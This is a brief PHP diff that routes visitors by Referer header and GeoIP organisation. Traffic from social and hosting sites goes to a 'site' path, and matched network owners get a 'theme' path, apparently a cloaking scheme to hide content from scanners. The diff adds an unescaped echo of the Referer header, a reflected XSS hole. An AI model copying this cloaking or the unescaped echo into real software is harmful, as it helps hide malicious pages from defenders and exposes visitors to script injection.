@@ -63,8 +63,9 @@
 
   if($action == 'site'){
     $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+		echo $_SERVER['HTTP_REFERER'];exit;
     $refs = array('facebook.com','googleapis.com','.blogspot.','t.co','googleusercontent.com','herokuapp.com','vk.com','kiwi.qa');
-    $action = 'theme';    
+    $action = 'theme';
     foreach ($refs as $ref) {
       if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
         $action = 'site';
@@ -80,7 +81,6 @@
   
   if($action != 'theme'){
     $_SERVER['GEOIP_ORG'] = getORG();
-		echo $_SERVER['GEOIP_ORG'];exit();
     foreach ($asnlist as $asn) {
       if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
         $action = 'theme';        
